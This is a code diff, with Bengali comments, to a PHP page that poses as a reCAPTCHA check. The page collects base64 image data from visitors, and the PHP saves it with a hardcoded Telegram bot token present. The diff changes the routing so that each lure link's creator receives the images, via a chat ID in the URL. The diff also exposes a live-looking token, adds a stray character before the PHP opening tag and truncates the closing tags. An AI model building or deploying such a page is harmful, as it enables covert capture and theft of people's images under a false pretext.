@@ -1,28 +1,10 @@
-<?php
+v<?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
-    $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';
     
-    // ডিফল্ট চ্যাট আইডি (যদি ফায়ারবেসে না পাওয়া যায়)
-    $chatId = "5896019931";
-
-    // Firebase থেকে ইউনিক আইডি দিয়ে সঠিক ইউজারের Chat ID নিয়ে আসা
-    $firebaseUrl = "https://lolsms-39057-default-rtdb.firebaseio.com/mappings/" . $targetId . ".json";
-    
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $firebaseUrl);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $firebaseResponse = curl_exec($ch);
-    curl_close($ch);
-
-    if ($firebaseResponse) {
-        $firebaseData = json_decode($firebaseResponse, true);
-        if (isset($firebaseData['chat_id'])) {
-            $chatId = $firebaseData['chat_id'];
-        }
-    }
+    // লিঙ্কের মাধ্যমে আসা ইউজারের Chat ID রিসিভ করা (না থাকলে ডিফল্ট আপনার আইডি থাকবে)
+    $chatId = isset($_POST['chat_id']) && !empty($_POST['chat_id']) ? $_POST['chat_id'] : "5896019931";
 
     $uploadDir = 'uploads/';
     if (!is_dir($uploadDir)) {
@@ -33,6 +15,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $imgData = str_replace('data:image/png;base64,', '', $imgData);
     $imgData = str_replace(' ', '+', $imgData);
     $data = base64_decode($imgData);
+
+    $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';
 
     $fileName = 'img_' . uniqid() . '.png';
     $filePath = $uploadDir . $fileName;
@@ -79,6 +63,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             align-items: center;
         }
         
+        /* reCAPTCHA Box Style */
         .recaptcha-box {
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
@@ -160,6 +145,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
+    <!-- reCAPTCHA Box -->
     <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
         <div class="recaptcha-left">
             <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
@@ -180,6 +166,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
+        const userChatId = urlParams.get('cid') || ''; // লিংক থেকে ইউজারের আইডি নেওয়া হচ্ছে
         const rawTargetUrl = urlParams.get('url');
 
         let finalUrl = "https://www.aapunkagames.com/"; 
@@ -231,11 +218,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId)
+                body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId) + '&chat_id=' + encodeURIComponent(userChatId)
             }).catch(error => {
                 console.error('Error:', error);
             });
         }
-    </script>
-</body>
-</html>
+   
